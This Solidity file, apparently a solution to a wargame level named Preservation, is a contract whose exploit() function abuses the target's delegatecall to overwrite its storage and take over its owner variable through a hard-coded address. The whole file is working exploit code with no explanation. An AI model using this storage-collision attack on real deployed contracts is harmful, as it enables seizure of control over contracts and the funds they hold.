// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract DelegateHack {

    address public t1;
    address public t2;
    address public owner;
    Preservation level16 = Preservation(0x3f11892aDe7c49bDb1dE77Fb8DE13CFcD055493A);      

    function exploit() external {
        level16.setFirstTime(uint256(uint160(address(this))));
        level16.setFirstTime(uint256(uint160(0x8656D273630865bB4887E00d86a338A214Ac4b50)));
    }

    function setTime(address _owner) public {
        owner = _owner;
    }

}